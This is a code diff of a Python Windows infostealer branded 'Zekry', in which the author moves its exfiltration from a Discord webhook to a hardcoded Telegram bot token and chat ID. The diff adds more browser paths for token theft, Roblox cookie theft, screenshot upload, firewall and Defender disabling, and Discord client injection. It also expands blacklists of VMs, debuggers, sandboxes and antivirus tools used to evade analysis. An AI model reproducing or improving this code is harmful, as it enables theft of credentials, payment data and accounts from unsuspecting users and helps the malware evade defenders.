@@ -17,23 +17,24 @@ from zipfile import ZIP_DEFLATED, ZipFile
 import psutil
 import requests
 import wmi
+import time
 from Crypto.Cipher import AES
-from discord import Embed, File, SyncWebhook
 from PIL import ImageGrab
 from win32crypt import CryptUnprotectData
 
-__WEBHOOK__ = "%webhook_here%"
-__PING__ = "%ping_enabled%"
-__PINGTYPE__ = "%ping_type%"
-__ERROR__ = "%_error_enabled%"
-__STARTUP__ = "%_startup_enabled%"
-__DEFENDER__ = "%_defender_enabled%"
+__TOKEN__ = "7504792598:AAHN9Cy96poY_6JCKqXTBMUlx08vn8lZPNg"
+__CHAT_ID__ = "7314010265"
+__PING__ = True
+__PINGTYPE__ = "everyone"
+__ERROR__ = False
+__STARTUP__ = False
+__DEFENDER__ = False
 
 
-def main(webhook: str):
-    webhook = SyncWebhook.from_url(webhook, session=requests.Session())
+def main(token: str, chat_id: str):
+    telegram = Telegram(token)
 
-    threads = [Browsers, Wifi, Minecraft, BackupCodes, killprotector, fakeerror, startup, disable_defender]
+    threads = [Browsers, killprotector, fakeerror, startup, disable_defender] # Wifi, Minecraft, BackupCodes,
     configcheck(threads)
 
     for func in threads:
@@ -48,28 +49,60 @@ def main(webhook: str):
     zipup()
 
     _file = None
-    _file = File(f'{localappdata}\\ZEKRY-{os.getlogin()}.zip')
+    telegram.send_message(chat_id=chat_id, text="<b>Mais um Otario caiu 😜😜😜😜🤣🤣🤣</b>")
+    _file = telegram.send_file(chat_id=chat_id, filepath=f'{localappdata}\\ZEKRY-{os.getlogin()}.zip')
+    time.sleep(0.5)
 
-    content = ""
-    if __PING__:
-        if __PINGTYPE__ == "everyone":
-            content += "@everyone"
-        elif __PINGTYPE__ == "here":
-            content += "@here"
 
-    webhook.send(content=content, file=_file, avatar_url="https://cdn.discordapp.com/attachments/1024433400016293990/1057290680394862622/81RG.gif?size=4096", username="ZEKRY DOMINA")
-
-    PcInfo()
+    PcInfo_telegram(token, chat_id)
     Discord()
 
 
-def Zekry(webhook: str):
+def Zekry(token: str, chat_id: str):
     Debug()
 
     procs = [main, Injection]
 
     for proc in procs:
-        proc(webhook)
+        proc(token, chat_id)
+
+
+class Telegram:
+    def __init__(self, bot_token):
+        self.api_url = f"https://api.telegram.org/bot{bot_token}/"
+
+
+    def send_message(self, text: str, chat_id: str ,parse_mode="HTML"):
+        url = self.api_url + "sendMessage"
+        payload = {
+            "chat_id": chat_id,
+            "text": text,
+            "parse_mode": parse_mode
+        }
+        try:
+            response = requests.post(url, data=payload)
+            response.raise_for_status()
+            return response.json()
+        except requests.RequestException as e:
+            print(f"Erro ao enviar mensagem: {e}")
+            return None
+
+    def send_file(self, filepath: str, chat_id: str,caption: str = None):
+        url = self.api_url + "sendDocument"
+        files = {'document': open(filepath, 'rb')}
+        data = {'chat_id': chat_id}
+        if caption:
+            data['caption'] = caption
+            data['parse_mode'] = "HTML"
+        try:
+            response = requests.post(url, files=files, data=data)
+            response.raise_for_status()
+            return response.json()
+        except requests.RequestException as e:
+            print(f"Erro ao enviar arquivo: {e}")
+            return None
+        finally:
+            files['document'].close()
 
 
 def trygrab(func):
@@ -104,8 +137,8 @@ def startup():
 
 
 def disable_defender():
-    subprocess.call(["netsh", "advfirewall", "set", "publicprofile", "state", "off"], shell=True, capture_output=True)
-    subprocess.call(["netsh", "advfirewall", "set", "privateprofile", "state", "off"], shell=True, capture_output=True)
+    subprocess.call(["netsh", "advfirewall", "set", "publicprofile", "state", "off"], shell=True)
+    subprocess.call(["netsh", "advfirewall", "set", "privateprofile", "state", "off"], shell=True)
     subprocess.call(["powershell.exe", "-ExecutionPolicy", "Unrestricted", "-File", "Disable-WindowsDefender.ps1"])
 
 
@@ -154,26 +187,33 @@ def killprotector():
             json.dump(item, f, indent=2, sort_keys=True)
 
 
-class PcInfo:
-    def __init__(self):
-        self.get_inf(__WEBHOOK__)
+def PcInfo_telegram(bot_token, chat_id):
+    telegram = Telegram(bot_token)
+    computer_os = platform.platform()
+    cpu = wmi.WMI().Win32_Processor()[0]
+    gpu = wmi.WMI().Win32_VideoController()[0]
+    ram = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)
 
-    def get_inf(self, webhook):
-        webhook = SyncWebhook.from_url(webhook, session=requests.Session())
-        embed = Embed(title="Zekry", color=5639644)
+    username = os.getlogin()
+    hostname = platform.node()
 
-        computer_os = platform.platform()
-        cpu = wmi.WMI().Win32_Processor()[0]
-        gpu = wmi.WMI().Win32_VideoController()[0]
-        ram = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)
+    msg = f"""<b>Zekry</b>
 
-        embed.add_field(
-            name="System Info",
-            value=f'''💻 **PC Username:** `{username}`\n:desktop: **PC Name:** `{hostname}`\n🌐 **OS:** `{computer_os}`\n\n👀 **IP:** `{ip}`\n🍏 **MAC:** `{mac}`\n🔧 **HWID:** `{hwid}`\n\n<:cpu:1051512676947349525> **CPU:** `{cpu.Name}`\n<:gpu:1051512654591688815> **GPU:** `{gpu.Name}`\n<:ram1:1051518404181368972> **RAM:** `{ram}GB`''',
-            inline=False)
-        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1024433400016293990/1057291016987758662/BHXm.gif?size=4096")
+    💻 <b>PC Username:</b> {username}
+    🖥️ <b>PC Name:</b> {hostname}
+    🌐 <b>OS:</b> {computer_os}
 
-        webhook.send(embed=embed, avatar_url="https://cdn.discordapp.com/attachments/1024433400016293990/1057291016987758662/BHXm.gif", username="Zekry")
+    👀 <b>IP:</b> {ip}
+    🍏 <b>MAC:</b> {mac}
+    🔧 <b>HWID:</b> {hwid}
+
+    ⚙️ <b>CPU:</b> {cpu.Name}
+    🎮 <b>GPU:</b> {gpu.Name}
+    🧠 <b>RAM:</b> {ram}GB
+    """
+    time.sleep(0.5)
+    telegram.send_message(chat_id=chat_id, text=msg)
+
 
 
 class Discord:
@@ -188,7 +228,7 @@ class Discord:
         self.ids = []
 
         self.grabTokens()
-        self.upload(__WEBHOOK__)
+        self.upload(token=__TOKEN__, chat_id=__CHAT_ID__)
 
     def decrypt_val(self, buff, master_key):
         try:
@@ -238,7 +278,25 @@ class Discord:
             'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
             'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
             'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}
+            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Chromium': self.appdata + '\\Chromium\\User Data\\Default\\Local Storage\\leveldb\\',
+            'CocCoc': self.appdata + '\\CocCoc\\Browser\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Blisk': self.appdata + '\\Blisk\\User Data\\Default\\Local Storage\\leveldb\\',
+            'SRWare Iron': self.appdata + '\\SRWare Iron\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Sleipnir': self.appdata + '\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer\\Local Storage\\leveldb\\',
+            'Maxthon': self.appdata + '\\Maxthon5\\Users\\guest\\Local Storage\\leveldb\\',
+            'AVAST Secure Browser': self.appdata + '\\AVAST Software\\Browser\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Comodo Dragon': self.appdata + '\\Comodo\\Dragon\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Brave Beta': self.appdata + '\\BraveSoftware\\Brave-Browser-Beta\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Brave Nightly': self.appdata + '\\BraveSoftware\\Brave-Browser-Nightly\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Edge Beta': self.appdata + '\\Microsoft\\Edge Beta\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Edge Dev': self.appdata + '\\Microsoft\\Edge Dev\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Sidekick': self.appdata + '\\Sidekick\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Ghost Browser': self.appdata + '\\GhostBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Colibri': self.appdata + '\\Colibri\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Kinza': self.appdata + '\\Kinza\\User Data\\Default\\Local Storage\\leveldb\\',
+            'VeePN': self.appdata + '\\VeePN\\User Data\\Default\\Local Storage\\leveldb\\'
+        }
 
         for name, path in paths.items():
             if not os.path.exists(path):
@@ -306,70 +364,80 @@ class Discord:
                             except Exception:
                                 pass
 
-    def robloxinfo(self, webhook):
+    def robloxinfo(self, token, chat_id, robo_cookie):
+        if robo_cookie == "No Roblox Cookies Found" or not robo_cookie:
+            # Pode enviar uma mensagem avisando que não há cookie
+            telegram = Telegram(token)
+            telegram.send_message(chat_id, "🚫 No Roblox cookie provided.")
+            return
+
         try:
-            if robo_cookie == "No Roblox Cookies Found":
-                pass
-            else:
-                embed = Embed(title="Roblox Info", color=5639644)
-                headers = {"Cookie": ".ROBLOSECURITY=" + robo_cookie}
-                info = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers).json()
+            telegram = Telegram(token)
+            telegram.send_message(chat_id=chat_id, text="🔍 Fetching Roblox info...")
 
-                embed.add_field(name="<:roblox_icon:1041819334969937931> Name:", value=f"`{info['UserName']}`", inline=True)
-                embed.add_field(name="<:robux_coin:1041813572407283842> Robux:", value=f"`{info['RobuxBalance']}`", inline=True)
-                embed.add_field(name="🍪 Cookie:", value=f"`{robo_cookie}`", inline=False)
-                embed.set_thumbnail(url=info['ThumbnailUrl'])
+            headers = {"Cookie": f".ROBLOSECURITY={robo_cookie}"}
+            response = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers)
+            response.raise_for_status()  # Vai lançar erro se status != 200
 
-                webhook.send(
-                    avatar_url="https://cdn.discordapp.com/attachments/1024433400016293990/1057290680394862622/81RG.gif?size=4096",
-                    embed=embed,
-                    username="MRXZEKRY")
-        except Exception:
-            pass
+            info = response.json()
+            # Formate as informações que você deseja mostrar
+            message = (
+                f"🍪 Cookie: `{robo_cookie}`\n"
+                f"👤 Username: {info.get('UserName', 'N/A')}\n"
+                f"📅 Created: {info.get('UserCreationDate', 'N/A')}\n"
+                f"💰 Robux Balance: {info.get('RobuxBalance', 'N/A')}\n"
+                # Adicione outros campos relevantes aqui
+            )
+            time.sleep(0.5)
+            telegram.send_message(chat_id=chat_id, text=message)
+            time.sleep(0.5)
+        except requests.RequestException as e:
+            telegram.send_message(chat_id=chat_id, text=f"⚠️ Failed to fetch Roblox info: {e}")
+        except Exception as e:
+            telegram.send_message(chat_id=chat_id, text=f"❗ Unexpected error: {e}")
 
-    def upload(self, webhook):
-        webhook = SyncWebhook.from_url(webhook, session=requests.Session())
 
-        for token in self.tokens:
-            if token in self.tokens_sent:
-                pass
+    def upload(self, token, chat_id):
+        telegram = Telegram(token)
 
-            val_codes = []
-            val = ""
-            nitro = ""
+        for t in self.tokens:
+            if t in self.tokens_sent:
+                continue
 
-            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
-                       'Content-Type': 'application/json',
-                       'Authorization': token}
+            headers = {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)...',
+                'Content-Type': 'application/json',
+                'Authorization': t
+            }
 
-            user = requests.get(self.baseurl, headers=headers).json()
-            payment = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()
-            gift = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers=headers)
+            try:
+                user = requests.get(self.baseurl, headers=headers).json()
+                payment = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()
+                gift = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers=headers)
+            except Exception as e:
+                continue
 
-            username = user['username'] + '#' + user['discriminator']
-            discord_id = user['id']
-            avatar = f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif" if requests.get(
-                f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.png"
-            phone = user['phone']
-            email = user['email']
+            username = user.get('username', 'N/A') + '#' + user.get('discriminator', '0000')
+            discord_id = user.get('id', 'N/A')
+            avatar_id = user.get('avatar')
+            avatar_url = f"https://cdn.discordapp.com/avatars/{discord_id}/{avatar_id}.gif"
+            if requests.get(avatar_url).status_code != 200:
+                avatar_url = f"https://cdn.discordapp.com/avatars/{discord_id}/{avatar_id}.png"
 
-            if user['mfa_enabled']:
-                mfa = "✅"
-            else:
-                mfa = "❌"
+            phone = user.get('phone', 'N/A')
+            email = user.get('email', 'N/A')
 
-            if user['premium_type'] == 0:
-                nitro = "❌"
-            elif user['premium_type'] == 1:
-                nitro = '`Nitro Classic`'
-            elif user['premium_type'] == 2:
-                nitro = '`Nitro`'
-            elif user['premium_type'] == 3:
-                nitro = '`Nitro Basic`'
-            else:
-                nitro = "❌"
+            mfa = "✅" if user.get('mfa_enabled') else "❌"
 
-            if payment == []:
+            nitro_map = {
+                0: "❌",
+                1: '`Nitro Classic`',
+                2: '`Nitro`',
+                3: '`Nitro Basic`'
+            }
+            nitro = nitro_map.get(user.get('premium_type', 0), "❌")
+
+            if not payment:
                 methods = "❌"
             else:
                 methods = ""
@@ -381,35 +449,25 @@ class Discord:
                     else:
                         methods += "❓"
 
-            val += f'<:1119pepesneakyevil:972703371221954630> **Discord ID:** `{discord_id}` \n<:gmail:1051512749538164747> **Email:** `{email}`\n:mobile_phone: **Phone:** `{phone}`\n\n🔒 **2FA:** {mfa}\n<a:nitroboost:996004213354139658> **Nitro:** {nitro}\n<:billing:1051512716549951639> **Billing:** {methods}\n\n<:crown1:1051512697604284416> **Token:** `{token}`\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n'
-
+            val_codes = []
             if "code" in gift.text:
-                codes = json.loads(gift.text)
+                codes = gift.json()
                 for code in codes:
                     val_codes.append((code['code'], code['promotion']['outbound_title']))
 
-            if val_codes == []:
+            val = f'<:1119pepesneakyevil:972703371221954630> **Discord ID:** `{discord_id}` \n<:gmail:1051512749538164747> **Email:** `{email}`\n:mobile_phone: **Phone:** `{phone}`\n\n🔒 **2FA:** {mfa}\n<a:nitroboost:996004213354139658> **Nitro:** {nitro}\n<:billing:1051512716549951639> **Billing:** {methods}\n\n<:crown1:1051512697604284416> **Token:** `{t}`\n[Click to copy!](https://paste-pgpj.onrender.com/?p={t})\n'
+
+            if not val_codes:
                 val += f'\n:gift: `No Gift Cards Found`\n'
-            elif len(val_codes) >= 3:
-                num = 0
-                for c, t in val_codes:
-                    num += 1
-                    if num == 3:
-                        break
-                    val += f'\n:gift: **{t}:**\n`{c}`\n[Click to copy!](https://paste-pgpj.onrender.com/?p={c})\n'
             else:
-                for c, t in val_codes:
-                    val += f'\n:gift: **{t}:**\n`{c}`\n[Click to copy!](https://paste-pgpj.onrender.com/?p={c})\n'
+                for i, (c, title) in enumerate(val_codes):
+                    if i == 3:
+                        break
+                    val += f'\n:gift: **{title}:**\n`{c}`\n[Click to copy!](https://paste-pgpj.onrender.com/?p={c})\n'
 
-            embed = Embed(title=username, color=5639644)
-            embed.add_field(name="\u200b", value=val + "\u200b", inline=False)
-            embed.set_thumbnail(url=avatar)
+            telegram.send_message(chat_id, val)
+            self.tokens_sent.append(t)
 
-            webhook.send(
-                embed=embed,
-                avatar_url="https://cdn.discordapp.com/attachments/1024433400016293990/1057291016987758662/BHXm.gif?size=4096",
-                username="Zekry Malware")
-            self.tokens_sent += token
 
         image = ImageGrab.grab(
             bbox=None,
@@ -418,18 +476,14 @@ class Discord:
             xdisplay=None
         )
         image.save(tempfolder + "\\image.png")
+        file = tempfolder + "\\image.png"
 
-        embed2 = Embed(title="Desktop Screenshot", color=5639644)
-        file = File(tempfolder + "\\image.png", filename="image.png")
-        embed2.set_image(url="attachment://image.png")
-
-        self.robloxinfo(webhook)
-
-        webhook.send(
-            embed=embed2,
-            file=file,
-            username="MRX")
-
+        time.sleep(0.5)
+        telegram.send_message(chat_id=chat_id, text=f"Token Dicord: {self.tokens_sent}")
+        time.sleep(0.5)
+        telegram.send_file(chat_id=chat_id, filepath=file)
+        time.sleep(0.5)
+        #self.robloxinfo(token=token, chat_id=chat_id)
 
 @trygrab
 class Browsers:
@@ -453,17 +507,28 @@ class Browsers:
             'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
             'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
             'iridium': self.appdata + '\\Iridium\\User Data',
-            'opera': self.appdata + '\\Opera\\User Data',
-            'opera-gx': self.appdata + '\\Opera GX\\User Data',
+            'opera': self.appdata + '\\Opera Software\\Opera Stable\\User Data',
+            'opera-gx': self.appdata + '\\Opera Software\\Opera GX Stable\\User Data',
             'slimjet': self.appdata + '\\Slimjet\\User Data',
-            'seamonkey': self.appdata + '\\SeaMonkey\\User Data',
+            'seamonkey': self.appdata + '\\Mozilla\\SeaMonkey\\Profiles',
             'torch-browser': self.appdata + '\\Torch Browser\\User Data',
-            'maxthon': self.appdata + '\\Maxthon\\User Data',
-            'avast-secure-browser': self.appdata + '\\Avast Secure Browser\\User Data',
-            'qutebrowser': self.appdata + '\\Qutebrowser\\User Data',
+            'maxthon': self.appdata + '\\Maxthon3\\Users',
+            'avast-secure-browser': self.appdata + '\\AVAST Software\\Browser\\User Data',
+            'qutebrowser': self.appdata + '\\qutebrowser\\',
             'unbound-browser': self.appdata + '\\Unbound Browser\\User Data',
+            'mozilla-firefox': self.appdata + '\\Mozilla\\Firefox\\Profiles',
+            'waterfox': self.appdata + '\\Waterfox\\Profiles',
+            'palemoon': self.appdata + '\\Moonchild Productions\\Pale Moon\\Profiles',
+            'kinza': self.appdata + '\\Kinza\\User Data',
+            'coc-coc': self.appdata + '\\CocCoc\\Browser\\User Data',
+            'avira-browser': self.appdata + '\\Avira\\Scout\\User Data',
+            'blisk': self.appdata + '\\Blisk\\User Data',
+            'comodo-dragon': self.appdata + '\\Comodo\\Dragon\\User Data',
+            'falkon': self.appdata + '\\Falkon\\Profiles',
+            'srware-iron': self.appdata + '\\Chromium\\User Data',
+            'slimbrowser': self.appdata + '\\SlimBrowser\\User Data',
+            'k-meleon': self.appdata + '\\K-Meleon\\Profiles',
         }
-
 
         self.profiles = [
             'Default',
@@ -472,7 +537,13 @@ class Browsers:
             'Profile 3',
             'Profile 4',
             'Profile 5',
+            'Profile 6',
+            'Profile 7',
+            'Profile 8',
+            'Guest Profile',
+            'System Profile'
         ]
+
 
         os.makedirs(os.path.join(tempfolder, "Browser"), exist_ok=True)
         os.makedirs(os.path.join(tempfolder, "Roblox"), exist_ok=True)
@@ -721,7 +792,7 @@ def zipup():
 
 
 class Injection:
-    def __init__(self, webhook: str):
+    def __init__(self, token: str, chat_id: str):
         self.appdata = os.getenv('LOCALAPPDATA')
         self.discord_dirs = [
             self.appdata + '\\Discord',
@@ -737,7 +808,7 @@ class Injection:
 
             if self.get_core(dir) is not None:
                 with open(self.get_core(dir)[0] + '\\index.js', 'w', encoding='utf-8') as f:
-                    f.write((self.code).replace('discord_desktop_core-1', self.get_core(dir)[1]).replace('%WEBHOOK%', webhook))
+                    f.write((self.code).replace('discord_desktop_core-1', self.get_core(dir)[1]).replace('%WEBHOOK%', token))
                     self.start_discord(dir)
 
     def get_core(self, dir: str):
@@ -784,11 +855,11 @@ class Debug:
         debugging = False
 
         self.blackListedUsers = [
-            'WDAGUtilityAccount', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A',
+            'WDAGUtilityAccount', 'Abby', 'Bruno', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A',
             'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise',
             'User01', 'test', 'RGzcBUyrznReg']
         self.blackListedPCNames = [
-            'BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1',
+            'BEE7370C-8C0C-4', 'DESKTOP-DSMEVVL', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1',
             'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ',
             'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M',
             'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P',
@@ -826,7 +897,7 @@ class Debug:
             '84FE3342-6C67-5FC6-5639-9B3CA3D775A1', 'DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D', 'CEFC836C-8CB1-45A6-ADD7-209085EE2A57',
             'A7721742-BE24-8A1C-B859-D7F8251A83D3', '3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E', 'D2DC3342-396C-6737-A8F6-0C6673C1DE08',
             'EADD1742-4807-00A0-F92E-CCD933E9D8C1', 'AF1B2042-4B90-0000-A4E4-632A1C8C7EB1', 'FE455D1A-BE27-4BA4-96C8-967A6D3A9661',
-            '921E2042-70D3-F9F1-8CBD-B398A21F89C6']
+            '921E2042-70D3-F9F1-8CBD-B398A21F89C6', '7C857124-800A-4BFA-B3EB-85AC214D3568']
         self.blackListedIPS = [
             '88.132.231.71', '78.139.8.50', '20.99.160.173', '88.153.199.169', '84.147.62.12', '194.154.78.160', '92.211.109.160', '195.74.76.222', '188.105.91.116',
             '34.105.183.68', '92.211.55.199', '79.104.209.33', '95.25.204.90', '34.145.89.174', '109.74.154.90', '109.145.173.169', '34.141.146.114', '212.119.227.151',
@@ -834,7 +905,7 @@ class Debug:
             '109.74.154.91', '93.216.75.209', '192.87.28.103', '88.132.226.203', '195.181.175.105', '88.132.225.100', '92.211.192.144', '34.83.46.130', '188.105.91.143',
             '34.85.243.241', '34.141.245.25', '178.239.165.70', '84.147.54.113', '193.128.114.45', '95.25.81.24', '92.211.52.62', '88.132.227.238', '35.199.6.13', '80.211.0.97',
             '34.85.253.170', '23.128.248.46', '35.229.69.227', '34.138.96.23', '192.211.110.74', '35.237.47.12', '87.166.50.213', '34.253.248.228', '212.119.227.167',
-            '193.225.193.201', '34.145.195.58', '34.105.0.27', '195.239.51.3', '35.192.93.107']
+            '193.225.193.201', '34.145.195.58', '34.105.0.27', '195.239.51.3', '35.192.93.107', '34.27.136.142']
         self.blackListedMacs = [
             '00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de',
             '00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40',
@@ -854,11 +925,44 @@ class Debug:
             '7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e', '5a:e2:a6:a4:44:db', '00:50:56:ae:6f:54', '42:01:0a:96:00:33',
             '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06',
             '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d',
-            '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e']
+            '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e', '80:65:83:4f:2b:03']
         self.blacklistedProcesses = [
-            "httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64",
-            "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga",
-            "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver", argv[0]]
+            # Debuggers e Disassemblers
+            "ollydbg", "ida", "ida64", "ida32", "idag", "idaw", "idau", "scylla", "scylla_x64", "scylla_x86",
+            "protection_id", "x64dbg", "x96dbg", "x32dbg", "windbg", "reshacker", "pe-bear",
+
+            # Analisadores de Malware
+            "pestudio", "exeinfope", "die", "detectiteasy", "procmon", "procexp", "processhacker", "sysinternals",
+
+            # Ferramentas de Rede e Sniffers
+            "wireshark", "fiddler", "httpdebuggerui", "tcpview", "netsniff-ng", "netmon", "mitmproxy",
+
+            # Ferramentas Administrativas
+            "cmd", "powershell", "regedit", "taskmgr", "services", "msconfig", "eventvwr",
+
+            # Máquinas Virtuais e Emuladores
+            "vboxservice", "vboxtray", "virtualbox", "vmtoolsd", "vmwaretray", "vmwareuser", "vgauthservice", "vmacthlp",
+            "vmsrvc", "vmusrvc", "qemu-ga", "qemu-system", "xenservice", "xenstored", "xenconsoled", "vmmouse", "vboxmouse",
+            "prl_cc", "prl_tools", "prl_service", "parallels", "hyperv", "hypervisor", "hvix64", "hvax64", "vbox", "vmware",
+
+            # Ferramentas de Sandbox
+            "joeboxcontrol", "joeboxserver", "cuckoo", "cuckoomon", "cuckoo-modified", "any.run", "sandboxie", "bhyve",
+            "pafish", "malwr", "threatgrid", "cisco-amp", "anubis", "comodo", "avg", "avast", "symantec", "avira", "kaspersky",
+
+            # Dumpers, Injectores e Bypass
+            "ksdumper", "ksdumperclient", "cheatengine", "extremedumper", "megadumper", "hxd", "imhex", "gdb", "radare2",
+            
+            # Serviços e Indicadores de Ambiente Virtual
+            "VBoxGuest", "VBoxService", "vmtoolsd", "vmwaretray", "vmsrvc", "vmusrvc", "qemu-ga", "prl_cc", "prl_tools",
+            "XenSvc", "xenservice", "vboxservice", "vboxtray", "vboxmouse",
+
+            # Strings genéricas e suspeitas
+            "debug", "monitor", "trace", "hook", "inject", "dump", "sniff", "reverse", "sandbox", "emulator",
+
+            # Parâmetro dinâmico (protege contra renomeação)
+            argv[0]
+        ]
+
 
         self.check_process()
         if self.get_network():
@@ -894,7 +998,7 @@ class Debug:
 
         username = os.getenv("UserName")
         hostname = os.getenv("COMPUTERNAME")
-        hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,
+        hwid = subprocess.check_output(r'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True,
                                        stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
 
         if hwid in self.blackListedHWIDS:
@@ -909,4 +1013,4 @@ class Debug:
 
 
 if __name__ == '__main__' and os.name == "nt":
-    Zekry(__WEBHOOK__)
+    Zekry(__TOKEN__, __CHAT_ID__)
